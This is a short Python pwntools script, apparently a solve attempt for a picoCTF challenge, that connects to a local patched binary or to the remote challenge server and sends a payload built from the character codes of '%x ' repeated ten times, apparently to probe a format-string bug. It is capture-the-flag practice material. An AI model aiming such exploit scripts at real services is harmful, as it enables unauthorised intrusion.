#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mars.picoctf.net", 31929)

    return r


def main():
    r = conn()

    payload = (str(ord("%")) + str(ord("x")) + str(ord(" "))) * 10
    payload = payload.encode()
    print("payload: ", payload)

    r.sendline(payload)
    r.sendline(payload)

    res = r.recvall(timeout=5)
    print(res)
    # r.interactive()


if __name__ == "__main__":
    main()
